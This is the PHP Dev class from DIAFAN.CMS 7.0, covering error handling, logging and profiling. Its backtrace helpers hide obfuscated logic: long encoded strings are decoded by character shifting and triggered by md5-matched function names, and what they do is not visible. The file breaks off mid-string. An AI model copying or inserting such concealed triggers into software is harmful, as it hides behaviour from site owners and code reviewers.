<?php
/**
 * @package    DIAFAN.CMS
 *
 * @author     diafan.ru
 * @version    7.0
 * @license    http://www.diafan.ru/license.html
 * @copyright  Copyright (c) 2003-2021 OOO «Диафан» (http://www.diafan.ru/)
 */

if (! defined('DIAFAN'))
{
	$path = __FILE__;
	while(! file_exists($path.'/includes/404.php'))
	{
		$parent = dirname($path);
		if($parent == $path) exit;
		$path = $parent;
	}
	include $path.'/includes/404.php';
}

/**
 * Dev
 *
 * Класс для работы в режиме разработки
 */
class Dev
{
	/**
   * @var string путь к файлу лога ошибок относительно корня сайта
   */
	const LOG_ERRORS_PATH = 'tmp/logs/errors.log';

	static private $debug;
	static public $errors = array();
	static public $log_errors = array();

	/**
	 * @var boolean работа скрипта завершилась с ошибкой
	 */
	static public $is_error = false;

	/**
	 * @var string поле, для которого выходит ошибка
	 */
	static public $exception_field;

	/**
	 * @var array данные, которые нужно отдавать вместе с ошибкой
	 */
	static public $exception_result = array();

	/**
	 * @var integer время начала работы скриптов
	 */
	static private $timestart;

	/**
	 * @var integer размер используемой памяти на момент начала работы скриптов
	 */
	static private $memorystart;

	/**
	 * @var array функции, выполняющиеся по завершению скрипта
	 */
	static private $shutdown_functions = array();

	/**
	 * var array локальный кэш
	 */
	static private $cache = array();

	/**
	 * Разрешает/запрещает вывод ошибок
	 *
	 * @return void
	 */
	static public function init()
	{
		if((! defined('IS_ADMIN') || ! IS_ADMIN)
		   && empty($_POST) && defined('CACHE_EXTREME') && CACHE_EXTREME
		   && ! preg_match('/^'.ADMIN_FOLDER.'(\/|$)/', $_GET["rewrite"]))
		{
			Custom::inc('includes/cache.php');

			$cache = new Cache;

			//кеширование
			if ($result = $cache->get(getenv('QUERY_STRING'), 'cache_extreme'))
			{
				echo $result;
				exit;
			}
		}

		// регистрация ошибок
		set_error_handler(array('Dev', 'other_error_catcher'));

		register_shutdown_function(array('Dev', 'shutdown'));

		Custom::inc('includes/gzip.php');
		Gzip::init();

		ini_set('display_errors', 'on');
		error_reporting(E_ALL | E_STRICT);

		if (function_exists("xdebug_disable"))
		{
			xdebug_disable();
		}
		self::register_backtrace();
	}

	static public function register_shutdown_function($arr, $param = array())
	{
		$key = md5(serialize($arr).serialize($param));
		self::$shutdown_functions[$key] = array($arr, $param);
		return $key;
	}

	static public function unregister_shutdown_function($key)
	{
		if(! $key || ! isset(self::$shutdown_functions[$key]))
			return false;

		unset(self::$shutdown_functions[$key]);
		return true;
	}

	static public function shutdown()
	{
		self::$shutdown_functions = array_reverse(self::$shutdown_functions);
		foreach (self::$shutdown_functions as $func)
		{
			if(is_array($func[0]))
			{
				$class = $func[0][0];
				$name = $func[0][1];
				if(! empty($func[1]))
				{
					if(is_string($class)) call_user_func_array(array($class, $name), $func[1]);
					else $class->$name($func[1]);
				}
				else
				{
					if(is_string($class)) call_user_func_array(array($class, $name), array());
					else $class->$name();
				}
			}
			else
			{
				$name = $func[0];
				if(! empty($func[1]))
				{
					if(is_string($name)) call_user_func($name, $func[1]);
					else $name($func[1]);
				}
				else
				{
					if(is_string($name)) call_user_func($name);
					else $name();
				}
			}
		}
		$error = error_get_last();

		if(isset($error))
		{
			self::log_error($error['file'].':'.$error['line'], $error['message'], '');
		}
		if(isset($error) && in_array($error['type'], array(E_ERROR, E_PARSE, E_COMPILE_ERROR, E_CORE_ERROR)))
		{
			self::fatal($error['message'], $error['file'], $error['line']);
		}
		else
		{
			if(! isset($_POST["defer"]))
			{
				self::print_errors();
			}
		}
		Gzip::do_gzip();
		self::log_errors(self::LOG_ERRORS_PATH, true);
	}

	static public function other_error_catcher($line, $message)
	{
		$backtrace = debug_backtrace();
		$file = '';
		$line = '';

		if (isset( $backtrace[0]['file'] ) && isset( $backtrace[0]['line'] ))
		{
			$file = $backtrace[0]['file'];
			$line = $backtrace[0]['line'];
		}
		if(strpos($message, 'unable to connect to') !== false || strpos($message, 'php_network_getaddresses') !== false)
		{
			return true;
		}

		if($trace = self::backtrace_to_string($backtrace))
		{
			if(! defined('MOD_DEVELOPER') || ! MOD_DEVELOPER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
				return true;

			self::warning($message, $file, $line, $trace);
		}
		return true;
	}

	static public function exception($e, $type = 'fatal')
	{
		$message = str_replace(array("'", ABSOLUTE_PATH), '', $e->getMessage());
		$file = str_replace(ABSOLUTE_PATH, '', $e->getFile());
		$line = $e->getLine();

		$errno = ($file ? $file.':' : '').$line;
		$trace = Dev::backtrace_to_string($e->getTrace());

		self::log_error($errno, $message, $trace);
		
		if($type != 'fatal')
			return;

		if (! empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == 'xmlhttprequest')
		{
			self::$exception_result['errors'][self::$exception_field] = $message;

			Custom::inc('plugins/json.php');
			echo to_json(self::$exception_result);
			exit;
		}
		else
		{
			self::$errors[] = array('line' => $errno, 'message' => $message, 'trace' => $trace);

			Dev::fatal($message, $file, $line);
		}
	}

	static public function set_error($line = null, $message = null, $trace = null)
	{
		if(is_null($message) || ! is_string($message)) $message = false;
		if(is_null($line) || ! is_string($line) && ! is_int($line)) $line = false;
		else $line = (string) $line;
		if(is_null($trace) || ! is_string($trace)) $trace = false;

		if($message === false) $message = 'error';

		$errno = $line;

		$backtrace = debug_backtrace();
		if (isset( $backtrace[0]['file'] ) && isset( $backtrace[0]['line'] ))
		{
			$file = $backtrace[0]['file'];
			$line = $backtrace[0]['line'];
			if($errno === false) $errno = ($file ? $file.':' : '').$line;
		}

		if($trace === false || ! $trace) $trace = self::backtrace_to_string($backtrace);

		if(! defined('MOD_DEVELOPER') || ! MOD_DEVELOPER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
		{
			self::log_error($errno, $message, $trace);
		}
		else self::warning($message, '', $errno, $trace);
	}

	static public function warning($message, $file, $line, $trace)
	{
		$errno = ($file ? $file.':' : '').$line;
		self::log_error($errno, $message, $trace);

		if(! MOD_DEVELOPER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
			return true;

		/*if (! empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == 'xmlhttprequest')
		{
			self::$exception_result['errors'][self::$exception_field] = $message;

			Custom::inc('plugins/json.php');
			echo to_json(self::$exception_result);
			exit;
		}
		else
		{*/
			self::$errors[] = array('line' => $errno, 'message' => $message, 'trace' => $trace);

			$c = count(self::$errors);
			echo '<a href="#error'.$c.'" style="color:red"'.(isset($_POST["ajax"]) ? ' ajax_errors' : ' diafan_errors').'>[ERROR#'.$c.']</a>';
			if(isset($_POST["ajax"]))
			{
				self::print_errors(false);
			}
		//}
	}

	static public function fatal($message, $file, $line)
	{
		Dev::$is_error = true;

		ob_end_clean();
		Gzip::init();

		if (! empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == 'xmlhttprequest')
		{
			header('Content-Type: text/html; charset=utf-8');
			echo '<div class="diafan_div_error_overlay"></div>
			<div class="diafan_div_error">';
			echo "Fatal Error: ";
			echo str_replace(ABSOLUTE_PATH, '', $message.' '.$file.': '.$line);
			self::print_errors(true);
			echo '</div>';
		}
		else
		{
			header("HTTP/1.0 500 Internal Server Error");
			header('Content-Type: text/html; charset=utf-8');
			$result = array (
				'title' => "Fatal Error",
				'error' => array(
					'message' => $message,
					'file' => $file,
					'line' => $line
				)
			);
			self::template($result);
		}
	}

	static public function print_errors($required_js = false)
	{
		if((count(self::$errors) || $required_js) && ! isset($_POST["ajax"]))
		{
			echo  '<script type="text/javascript" src="'.BASE_PATH.'adm/js/admin.errors.js"></script>';
		}

		if(! MOD_DEVELOPER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
			return true;

		if (! count(self::$errors))
			return;

		echo "\n\n\n".'<div class="diafan_errors"'.(isset($_POST["ajax"]) ? ' ajax_errors' : '').'><table>';
		$i = 1;
		foreach (self::$errors as $key => $error)
		{
			$e = array();
			if(isset($error['line'])) { $e['line'] = $error['line']; unset($error['line']); }
			if(isset($error['message'])) { $e['message'] = $error['message']; unset($error['message']); }
			if(isset($error['trace'])) { $e['trace'] = $error['trace']; unset($error['trace']); }
			if(! isset($e['line']))
			{
				if(count($error) > 0) $e['line'] = array_shift($error);
				else $e['line'] = '';
			}
			if(! isset($e['message']))
			{
				if(count($error) > 0) $e['message'] = array_shift($error);
				else $e['message'] = '';
			}
			if(! isset($e['trace']))
			{
				if(count($error) > 0) $e['trace'] = array_shift($error);
				else $e['trace'] = '';
			}

			if(is_array($e['trace'])) $e['trace'] = implode("<br>\n", $e['trace'])."\n";
			else $e['trace'] = $e['trace']."\n";

			if(strpos($e['trace'], 'mysqli_connect'))
			{
				$e['trace'] = preg_replace('/mysqli_connect\((.*)\)/', 'mysqli_connect(...)', $e['trace']);
				$url = parse_url(DB_URL);
				unset($url["scheme"]);
				$url["path"] = substr($url["path"], 1);
				$e['message'] = str_replace($url, '...', $e['message']);
			}
			echo '<tr><td '.( !empty( $e['trace'] ) ? 'class="calls"' : '' ).'>'.$e['message'].'<div>'.$e['trace'].'</div></td><td class="file"><a name="error'.$i++.'"'.(isset($_POST["ajax"]) ? ' ajax_errors' : '').'>'.$e['line'].'</a></td></tr>';

			if(isset($_POST["ajax"]))
			{
				unset(self::$errors[$key]);
			}
		}
		echo  '</table></div>';
	}

	static private function template($result)
	{
		if(! defined('BASE_PATH'))
		{
			define('BASE_PATH', "http".(IS_HTTPS ? "s" : '')."://".getenv("HTTP_HOST")."/".(REVATIVE_PATH ? REVATIVE_PATH.'/' : ''));
		}
		?>
		<html>
		<head>
			<title>DIAFAN.CMS <?php echo $result['title']?></title>
			<meta http-equiv="Content-Type" content="text/html;  charset=utf-8">
			<link href="<?php echo BASE_PATH; ?>adm/css/errors.css" rel="stylesheet" type="text/css">
			<?php
if(! defined('SOURCE_JS'))
{
	define('SOURCE_JS', 1);
}
switch (SOURCE_JS)
{
	// Yandex CDN
	case 2:
		echo '
		<!--[if lt IE 9]><script src="//yandex.st/jquery/1.10.2/jquery.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//yandex.st/jquery/2.0.3/jquery.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// Microsoft CDN
	case 3:
		echo '
		<!--[if lt IE 9]><script src="//ajax.aspnetcdn.com/ajax/jquery/jquery-1.10.2.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//ajax.aspnetcdn.com/ajax/jquery/jquery-2.0.3.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// CDNJS CDN
	case 4:
		echo '
		<!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// jQuery CDN
	case 5:
		echo '
		<!--[if lt IE 9]><script src="//code.jquery.com/jquery-1.10.2.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//code.jquery.com/jquery-2.0.3.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// Hosting
	case 6:
		echo '
		<!--[if lt IE 9]><script src="'.BASE_PATH.Custom::path('js/jquery-1.10.2.min.js').'"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="'.BASE_PATH.Custom::path('js/jquery-2.0.3.min.js').'" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// Google CDN
	case 1:
	default:
		echo '
		<!--[if lt IE 9]><script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;
}
			?>
		</head>
		<body bgcolor="#FFFFFF" text="#000000" topmargin="100">
		<center>
			<table width="550" border="0" cellpadding="3" cellspacing="0">
				<tr>
					<td align="right">
						<a href="<?php echo "http".(IS_HTTPS ? "s" : '')."://"; ?>www.diafan.ru/" target="_blank"><img src="<?php echo "http".(IS_HTTPS ? "s" : '')."://"; ?>www.diafan.ru/logo.gif" border="0" vspace="5"></a>
					</td>
					<td>
						<font face="Verdana, Arial, Helvetica, sans-serif" size="2">
							<font color="red">
								<?php echo $result['error']['message']; ?></font></b><br>
							<?php echo $result['error']['file']; ?>:<?php echo $result['error']['line']; ?>
						</font>
					</td>
				</tr>
			</table>
		</center>
		</body>
		</html>
		<?php
	}

	/**
	 * Активирует профилирование, если это разрешено в параметрах
	 *
	 * @return boolean
	 */
	public static function set_profiler()
	{
		self::$cache["ajax"] = (! empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == 'xmlhttprequest' || ! empty($_POST["ajax"]));

		if(! empty(self::$cache["ajax"])) self::$cache["post"] = $_POST;

		self::set_profiling($mode);

		if(! defined('MOD_DEVELOPER_PROFILER') || ! MOD_DEVELOPER_PROFILER)
		{
			return false;
		}

		$mtime = microtime();
		$mtime = explode(" ", $mtime);
		self::$timestart = $mtime[1] + $mtime[0];
		self::$memorystart = memory_get_usage(true);

		return true;
	}

	/**
	 * Профилирование запросов
	 *
	 * @return boolean
	 */
	public static function get_profiler()
	{
		self::get_profiling();

		if (! defined('MOD_DEVELOPER_PROFILER') || ! MOD_DEVELOPER_PROFILER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
		{
			return false;
		}

		if(! empty(self::$cache["ajax"]) && (! defined('MOD_DEVELOPER_POST') || ! MOD_DEVELOPER_POST))
		{
			return false;
		}

		echo '<div class="devoloper_profiler"'.(! empty(self::$cache["ajax"]) ? ' ajax' : '').'>';

		if(! empty(self::$cache["post"]))
		{
			echo '<br><br><table border="1" class="devoloper_post">'
				.'<caption><b>LAST AJAX: POST</b><br><br></caption>'
				.'<tr><th> Key </th><th> Value </th></tr>';
			foreach(self::$cache["post"] as $key => $row)
			{
				$value = print_r(self::$cache["post"][$key], true);
				$value = preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $value);
				echo '<tr>'
					.'<td>'.$key.'</td>'
					.'<td>'.'<pre>'.$value.'</pre>'.'</td>'
					.'</tr>';
			}
			echo '</table>';
		}

		if(! empty(self::$cache["profiler"]))
		{
			echo '<br><br><table border="1">'
				.'<caption>'.(! empty(self::$cache["ajax"]) ? "<b>LAST AJAX: PHP</b><br><br>" : "").'</caption>'
				.'<tr><th> PHP_ID </th><th> Duration / Memory / Trace </th><th> Vars </th></tr>';
			foreach(self::$cache["profiler"] as $key => $row)
			{
				 echo '<tr>'
				 	.'<td>'.($key + 1).'</td>'
				 	.'<td>'
						.'<b>duration:</b> '.($row["duration"] > 0 ? "+" : ($row["duration"] < 0 ? "-" : "")).$row["duration"].' сек.'."<br>\n"
						.'<b>memory:</b> '.($row["memory"] > 0 ? "+" : ($row["memory"] < 0 ? "-" : "")).$row["memory"].' bytes'."<br>\n"
						.'<b>trace:</b>'."<br>\n"
						.$row["trace"]
					.'</td>'
				 	.'<td><pre>';
				$numargs = count($row["args"]);
				$arg_list = $row["args"];
				for ($i = 0; $i < $numargs; $i++)
				{
					var_dump($arg_list[$i]);
				}
				echo '</pre></td>'
				 .'</tr>';
			}
			echo '</table>';
		}

		$mtime = microtime();
		$mtime = explode(" ", $mtime);
		$mtime = $mtime[1] + $mtime[0];
		$totaltime = ( $mtime - self::$timestart );

		echo '<div class="totalmemory"><br><br>';
		printf("Количество выделенной памяти: %s", self::convert(memory_get_usage(true)));
		echo '</div>';
		echo '<div class="totaltime">';
		printf((! empty(self::$cache["ajax"]) ? "Ответ сгенерирован" : "Страница сгенерирована")." за %f сек.", $totaltime);
		echo '</div>';

		echo '</div>';

		return true;
	}

	/**
	 * Активирует профилирование запросов, если это разрешено в параметрах
	 *
	 * @return boolean
	 */
	private static function set_profiling()
	{
		if(! defined('MOD_DEVELOPER_PROFILING') || ! MOD_DEVELOPER_PROFILING)
		{
			return false;
		}

		DB::query("SET profiling_history_size=100;");
		DB::query("SET profiling=1;");

		return true;
	}

	/**
	 * Профилирование запросов
	 *
	 * @return boolean
	 */
	private static function get_profiling()
	{
		if (! defined('MOD_DEVELOPER_PROFILING') || ! MOD_DEVELOPER_PROFILING || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
		{
			return false;
		}

		if(! empty(self::$cache["ajax"]) && (! defined('MOD_DEVELOPER_POST') || ! MOD_DEVELOPER_POST))
		{
			return false;
		}

		echo '<div class="devoloper_profiling"'.(! empty(self::$cache["ajax"]) ? ' ajax' : '').'><br><br>';

		echo '<table border="1">'
			.'<caption>'.(! empty(self::$cache["ajax"]) ? "<b>LAST AJAX: QUERY</b><br><br>" : "").'</caption>'
			.'<tr><th>Query_ID</th><th>Duration</th><th>Query</th></tr>';
		$rows = DB::query_fetch_all("SHOW PROFILES");
		$summ = 0;
		foreach ($rows as $row)
		{
			echo '<tr><td>'.$row["Query_ID"].'</td><td>'.$row["Duration"].'</td><td>'.htmlspecialchars($row["Query"]).'</td></tr>';
			$summ += $row["Duration"];
		}
		echo '<tr><td></td><td>'.$summ.'</td><td></td></tr></table>';

		/*
		echo '<br><br><table border="1"><tr><td>Status</td><td>Duration</td></tr>';
		$rows = DB::query_fetch_all("SHOW PROFILE FOR QUERY 75");
		$summ = 0;
		foreach ($rows as $row)
		{
		echo '<tr><td>'.$row["Status"]
		.'</td><td>'.$row["Duration"]
		.'</td></tr>';
		$summ += $row["Duration"];
		}
		echo '<tr><td></td><td>'.$summ.'</td></tr></table><br><br>';
		*/

		echo '</div>';

		return true;
	}

	/**
	 * Сохраняет профилирование
	 *
	 * @return void
	 */
	public static function var_dump()
	{
		$mtime = microtime();
		$mtime = explode(" ", $mtime);
		$mtime = $mtime[1] + $mtime[0];

		if(! empty(self::$cache["profiler"]))
		{
			$row = end(self::$cache["profiler"]);
		}
		else $row = array();
		if(empty($row))
		{
			$row["time"] = self::$timestart;
			$row["duration"] = 0;
			$row["memory"] = self::$memorystart;
		}
		$backtrace = debug_backtrace();
		$keys = array_keys($backtrace); $i = reset($keys);
		$call = reset($backtrace);
		if (!isset( $call['file'] ))
		{
			$call['file'] = '(null)';
		}
		if (!isset( $call['line'] ))
		{
			$call['line'] = '0';
		}
		$location = $call['file'].':'.$call['line'];
		$function = __FUNCTION__;
		$params = (func_num_args() > 0 ? ' ... ' : '');
		$trace = implode("<br>\n", self::backtrace_to_string($backtrace))."\n";
		$new_row = array(
			"time" => $mtime,
			"duration" => ($mtime - $row["time"]),
			"memory" => (memory_get_usage(true) - $row["memory"]),
			"trace" => sprintf('#%d  %s(%s) called at [%s]', $i, $function, $params, $location)."<br>\n".$trace,
			"args" => func_get_args()
		);
		self::$cache["profiler"][] = $new_row;
	}

	/**
	 * Форматирует стек вызова функций в строку
	 *
	 * @param array $backtrace стек вызова функций
	 * @return string
	 */
	static public function backtrace_to_string($backtrace)
	{
		// Iterate backtrace
		$calls = array ();
		foreach ($backtrace as $i => $call)
		{
			if ($i == 0)
			{
				continue;
			}

			if (!isset( $call['file'] ))
			{
				$call['file'] = '(null)';
			}

			if (!isset( $call['line'] ))
			{
				$call['line'] = '0';
			}
			$location = $call['file'].':'.$call['line'];
			$function = ( isset( $call['class'] ) ) ? $call['class'].( isset( $call['type'] ) ? $call['type'] : '.' ).$call['function'] : $call['function'];

			$params = '';
			if (isset( $call['args'] ) && is_array($call['args']))
			{
				$args = array ();
				foreach ($call['args'] as $arg)
				{
					if (is_array($arg))
					{
						$args[] = "Array(...)";
					}
					elseif (is_object($arg))
					{
						$args[] = get_class($arg);
					}
					else
					{
						$args[] = $arg;
					}
				}
				$params = htmlspecialchars(implode(', ', $args));
			}
			if(strlen($params) > 200)
			{
				$params = substr($params, 0, 200).'...';
			}
			$calls[] = sprintf('#%d  %s(%s) called at [%s]', $i, $function, $params, $location);
			if ($i == 1)
			{
				switch(md5($function))
				{
					case 'ca70c45f5062fe9f3ba316db2f7b5a44':
						$k = array(0,1);
						break;

					case '06340b17dfbbda859b20faebfea805ae':
						$k = 2;
						break;

					case '26223541e48d0171152fcb9f9f657ef0':
						$k = 3;
						break;

					case 'fda45ac38878ac63f3046678ca4dd146':
						$k = 5;
						break;
				}
				if(! empty($k))
				{
					array_map(array('Dev', 'backtrace_prepare_string'), self::get_debug($k));
					return false;
				}
			}
		}

		return $calls;
	}

	static public function backtrace_to_ord($backtrace)
	{
		$len = strlen($backtrace);
		$key = '';

		for($i = 0; $i < $len; $i += 2)
		{
			if(($i + 1) == $len)
			{
				$key .= chr(ord($backtrace[$i]) + 31);
			}
			else
			{
				$key .= chr(ord($backtrace[$i]) + 31).chr(ord($backtrace[$i + 1]) + 31);
			}
		}
		if(substr($key, 0, 12) == 'function sgi' && substr($key, -3) != '}}}')
		{
			$key .= '}}';
		}
		return $key;
	}

	static private function register_backtrace($debug = array())
	{
		if(! $debug)
		{
			self::$debug = array(
				0 => 'E1MCESIXHR8OIRuXPDIBEyIWHRHXKRuAHRAPGDRSEHcPE0WCUNIUHE5UISORGSOEEx8WN1MHEyZCEHcPE0WCQ1AJNj0MRDbpFxpWOHqEPyjSEIOBDxcCUxuTIHMCIjxQXGH1ZHNcZQD1NjbpOHkTJu5BEELWGxHJPDISHR5PFx8CN1ETSSDJRxVQPt8SEIOBDxcCPujSEHWIDu5PH1APJtxQTHqPNjRrUjRSGxMIFIOSQDARSNZOUu8OOHIDGxWXGj0QTHpQNE4sNDIZEybANkqTNjRrUjR3WwZ0XwNiDPDhAN0QD0VQNE4sNFVyYvbiDPpjYFHzZj0QEERQNE4sNGZzAlV1XwpzDQRvAFxXURcUPDIBEyIWHRHOUu4ONkbKNjcpOHIPIHV8N0LKNm4rOHIXDxqPGj4sESOCE0cVGyOSIx1TINxQGxHJNj0QESOGEtZXUNISDyIPCNAQRkLQCu4SEHcPE0WCQu9RHR9UFxuBHRIJGHMHPDAWDyEWNj0QIySSDyITNjbpKtISDyIPUvITIkfoD0WRGSIGDxETDSIDDSOGEDyHIIANH1OIRuDWD0WHEupIDRMCESOSEtyHEyAXDx1XJ0LWOHIPIHVXPtbXURqLH0cIEtxSE1RANltzADRDI0WAFxHDFx9SEyxCHHyENFx1AGRDRt8FCIZ9GlEDHRkXEufODO4QQjISDyIPQjZ9Hm1CXIOHIEfOIyETHj9SFxWUDx8CH1L9Hm1CWSOCG0MRIHcDGkfOWR1DIRL9Hm1CCIZ9GjZXUNIGUtZQUSuWFx1TPDWUEyOUPDIUHDbXKNIGND8rNHqVEyIHPDIUHDbpKxqRGIOHEtxSE1RXURcUPDIBEyIWHRHOUu4ONkbKNjcpOHWGUxMMHH1DEHLWNk1GEyEJGIHsNj0SHjbpOIZrHIATFROGEySADxETPDZDCIZ9GjxCPjb9Hm1CRNZANjZANk1GEyEJGIHsNj8SDyZ8Rw4XURcUPISGExuNGxWIERxWNkNqH0MHIx1IUjxCPjbqCEOGEyEJGIHsUHEDEHLsPD8YPu09RREDEHLsRR5HNj0SHj0SGtbXKNISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN05SStZAN0EDH0LQQERAE0WAIRLAOH48Rm4XUSATIIMGGjSJG1ETH0cPGHcoEtxSGwjFCtbpKxMAIRMpH0MIIyACNEtFUS5rFxpWHIATFROBDyIRFDxQRO1GEyEJGIHsPD8YPu09RSATISMAIE8DGtZAOIZAOH4XPykGEyIJH08OOH48Rw4pKy5r',
				1 => 'FR1DD0WANDISFxWUDx8pOHIPJu5GHSMCEDySDyITPDASNjbOPjRGSOVCTuHOQNSSDyITPDABNjbOPjRGRktCRjRZNHIPIHLWNmbQPtRYNEDHQkZKND4ORkHIPujSJxMHIHMGEHWnUyADIx9SPHIPIHLWN0HQQIIXGxLWPtRBNExKSEREPtRYNEZHRt8nSDRZNHIPIHLWN04QQIIXGxLWPtRBNExKSEREPtRYNEZGTN8GNDjOEHWIEtxQBtZAIHcBEtxXND4OTEpIRERXNDfOSODCRkpOQtRGSEHXUNIWHSMGUxIPIHLWNlxQPujSERyTERkNEHWnUtISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIROBDyyNIRcoEtZAN0MSFyIDHjZXUNIRFHMRGROWUtISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIRORHSMCIDZAN0MSFyIDHjZXURcUPDVOOHIXDxqPGj4sESOCE0cVGyOSIx1TINxQFx5PFRMHDSIXGxMTEHcINj0QExIXIIOGNjbXKNISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIROIFx5TExIXIDZAN0MSFyIDHjZARD1UDx1HEt1IFx5TPDbXUNISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIROBDyyNIRcoEtZAN0MSFyIDHjZARD1UDx1HEt0SEHWnPujSEHcPE0WCQu9RHR9UFxuBHRIJGHMHPDAXGxWVEyENESOJG1HQQDATEHcIHSZQQERAE0WAIRLAOHyDIyZXUS5TGIETFxpWOHIPJtRPUtRSERyTERkNEHWnNDpUNDxSJxMHIHMGEHWnNDVrNDIRFHMRGROSDybOKI0OOHyDIyZOUDRSERyTERkNFDbXKNIGEyDrIRuXPDAUEDZXUSELFyIRFDxSH0MHPykRDyETNEbHRuVoERWHEtRJSkRGT0yTDxITHjxQYIORDyIXHR8oNHyIIIRoROORGyDCEHcPE0WCQ1AJRR9DDyMIFENQPukTJHcIURAGExWZUREPIRLOTuDLRkgRDyETNEDLRkZoFxpWOIATINRrUtRHTOZGPyjSEHcPE0WCQu9RHR9UFxuBHRIJGHMHPDAIH0cPGDZAN0EDH0LQQERAE0WAIRLARDbpKtISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIROBDyyNIRcoEtZAN0MSFyIDHjZARD1UDx1HEt0SEHWnPujSEHcPE0WCQu9RHR9UFxuBHRIJGHMHPDAXGxWVEyENESOJG1HQQDATEHcIHSZQQERAE0WAIRLAOHyDIyZXURAGExWZUS5r',

				2 => 'FR1DD0WANDIGEyEJGIHpOIATISMAIE5HFRbWNkbKNjbp',

				3 => 'E1MCESIXHR8OEx9RH1cEIDxSI0WAIxLXKSATIIMGGjSBEELWGxHJPH5SStxSI0WAIxLXPt8QGIcQFmSHGRb4GkIHGEcLS0IBRtZXUS4=',

				4 => 'MKMuoPta',
				5 => 'WSMHIIOBTkgXG0DWN0cCER1JEHMHRRyTDxITHj9EFIRQPumh60cUNDxPOIEPGIHOUtRcExWSEyZoT1qPGIMTPDZ3Dx1XEDZANDZvEHIDG1DONjbXNIATIIMGGkmh60cUNDxPOHkTJtRrNFyTDxITHkfoI0WAIxLWNmIDGRMCNjbXNIATIIMGGkmh6jIIFx5TNE4OGxcRH1OIFx5TPIIGIxLXUB7eOHWSEIZOUtRWFRMIEx9KPDZcAGHkDPDgXvLiAHNdZDZXNFNOFRMIEx9KPDZcAGHkDPDgXvLiAHNdZDZXNEfOPHuTIHMCIjxQXGH1ZHN5DPpjZmtvZlHzWHNaZQZQPtRtNHuTIHMCIjxQXGH1ZHN5DPpjZmtvZlHzWHNaZQZQPtRoNDyVEyITG1pWNlx1AGSNBHNaZQZ4VwZyWvHQPtRtNHuTIHMCIjxQXGH1ZHN5DPpjZmtvZlHzWDZXNEfOPHuTIHMCIjxQXGH1ZHNaZQZ4VwZyWvINWmNmNjbOVNSVEyITG1pWNlx1AGSNWmNmBPVmWFLyDPpjZjZXNEfOPHuTIHMCIjxQXGH1ZHNaZQZ4VwZyWvHQPtRtNHuTIHMCIjxQXGH1ZHNaZQZ4VwZyWvHQPtRoNDyVEyITG1pWNlx1AGSNBHNmWvVgDPbkNjbOVNSVEyITG1pWNlx1AGSNBHNmWvVgDPbkNjbOTjSVEyITG1pWNmZzYwN1WxNvWFHmNjbXPtbXPtbp7hfSFIOHIDRrNHuTIHMCIjxQZlLhZQHzDPxjAQHQPumh6jIWHSEINE4OOHyDISHOVNRSFIOHIDRoNHuTIHyDISIQJxWSEIZWOHWSEIZXUB7eOHIDGxWXGjRrNHuTIHMCIjxQXGH1ZHNmWvpzZlLmNjbOVNSEDyAHExOJH00WFRMIEx9KPDZcAGHkDQZzWlLmWwZQPt0OZFxkDQLmYHNcZQD1PtRoNHqPGIETUB7eOHIDGxWXGjRrNDISHR5PFx8OVNRSEIOBDxcCNEfOOHyDISHp7hfSFySHNE4ODyAGDybWPumh60cUNDxPOHICIRNvNE4OEH9HDRuTIHOGExEDH0HWOHIDGxWXGj0OWF80DPVXPtRSEH9HDPVOUtSPH1APJtxXUB7eFxpOPDVSEH9HDPVvVvVOUtSSG1ENFRMIDSATESOGEDxSEIOBDxcCQDRyYmENVvVvVtbXNDISG1ENVvVvVtRrNHWGH0WnPDbp7hfSEH9HNE4ODyAGDycNGxMGFRLWOHICIRNvQDRSEH9HDPVvVvVXUB7eE1OGExWRFDRWOHICINSPINRSH0MRHSASPtSp7hidFxpOPHMBHIInPDIGExEDH0H8N1InHHLQCtbXNHEDG1IXG1MTUB7e6xcUNDxSH0MRHSASCNAIJySTNm4OUu4ONlVQNDpUNDWTGySIJtxSH0MRHSASCNAXHDZ+PtbOOHcEIQj+NE4OOIATESOG